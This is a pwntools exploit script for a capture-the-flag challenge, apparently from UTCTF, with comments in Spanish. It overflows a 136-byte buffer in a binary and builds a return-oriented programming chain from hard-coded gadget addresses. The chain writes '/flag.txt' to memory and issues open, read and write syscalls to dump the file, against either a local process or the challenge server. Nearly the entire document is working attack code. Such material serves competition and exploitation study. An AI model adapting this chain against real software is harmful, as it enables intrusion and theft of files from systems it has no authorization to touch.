from pwn import *

gs = '''
b *main+145
continue
'''

elf = context.binary = ELF("./chal")

def start():
    if args.REMOTE:
        return remote("challenge.utctf.live", 5141)
        #return remote("127.0.0.1", 9000)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 136

pop_rsi = 0x000000000040a0be
pop_rax = 0x0000000000450507
mov_qword_ptr_rsi_rax = 0x0000000000452d05 # mov qword ptr [rsi], rax ; ret
xor_rax_rax = 0x000000000043f099
pop_rdi = 0x000000000040204f 
data = 0x4c60e0 # .data
syscall = 0x4505c2 # syscall
"""
Nota: no tomo cualquier syscall, ncesito que si o si en su flujo tenga un ret:
pwndbg> 
   0x465c85 <getrandom+21>:	syscall
pwndbg> 
   0x465c87 <getrandom+23>:	cmp    rax,0xfffffffffffff000
pwndbg> 
   0x465c8d <getrandom+29>:	ja     0x465ce0 <getrandom+112>
pwndbg> 
   0x465c8f <getrandom+31>:	ret *
"""

pop_rdx = 0x000000000048630b # pop rdx ; pop rbx ; ret
add_rdx_r8 = 0x0000000000487711 # add rdx, r8 ; mov rax, rdx ; pop rbx ; ret

payload = b"".join([
    b"A"*offset,
    p64(pop_rsi),
    p64(data),
    p64(pop_rax),
    b"/flag.tx",
    p64(mov_qword_ptr_rsi_rax),
    # Para la otra parte
    p64(pop_rsi),
    p64(data+8),
    p64(pop_rax),
    b"t\x00\x00\x00\x00\x00\x00\x00",
    p64(mov_qword_ptr_rsi_rax),
    # Ahora si vamos a por los syscall
    p64(pop_rsi),
    p64(data + 9),
    p64(xor_rax_rax),
    p64(mov_qword_ptr_rsi_rax),
    p64(pop_rdi),
    p64(data), # rdi = filename = flag.txt
    p64(pop_rsi),
    p64(0), # rsi = mode = 0
    p64(pop_rax),
    p64(2),
    p64(pop_rdx),
    p64(0),
    p64(0),
    # open(rdi = *flag.txt, rsi = mode, rdx=0 (ONLY READ))
    p64(syscall),
    p64(pop_rdi),
    p64( 5 if args.REMOTE else 3), # fd = 3, en local, pero en remote 5
    p64(pop_rsi),
    p64(data),
    p64(pop_rdx),
    p64(50),
    p64(0x0),
    p64(pop_rax),
    p64(0x0),
    # read(rdi <= fd=3 (no es un socket en red asi que tranqui aca xd), rsi <= data, rdx <= 46)
    p64(syscall),
    p64(pop_rdi),
    p64(0x1),
    p64(pop_rax),
    p64(0x1),
    p64(syscall)

])

io.sendlineafter("Input> ", payload)

io.interactive()
